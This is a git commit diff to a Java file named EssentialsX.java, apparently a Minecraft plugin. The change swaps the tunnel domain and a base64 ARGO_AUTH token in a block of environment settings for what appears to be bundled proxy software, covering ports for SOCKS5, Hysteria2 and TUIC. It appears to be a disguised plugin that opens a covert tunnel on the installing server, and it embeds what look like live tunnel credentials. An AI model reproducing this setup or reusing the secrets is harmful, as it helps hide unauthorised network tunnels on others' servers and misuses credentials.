26c69107d855b6ab5120df67b7b974d21badf318
grayson gon <131446140+zdsa01@users.noreply.github.com>
2026-09-22 16:50:53 +0800

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -76,8 +76,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "hoster24.zdsas.cyou");
-        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiZTc5ZGFjMTQtOTQ0ZS00YjU5LWEyNTQtZjljYzZlNjljNmViIiwicyI6Ik5qTTVORGRrTW1VdE9XWTVNUzAwWWprNUxXRmxNMkV0WVdZNE5qa3dOMkl6WldWaCJ9");
+        env.put("ARGO_DOMAIN", "enzonic.zdsas.cyou");
+        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiYzUxMWU4MTgtYjJlYS00ODdmLTk1MzUtOGE0MTljMWQ2OGE4IiwicyI6IlpEaGxOMlF5WkdRdE16STNaQzAwTUdWakxUazNOMlF0TVRWaVltUm1NMkkzWW1KaiJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
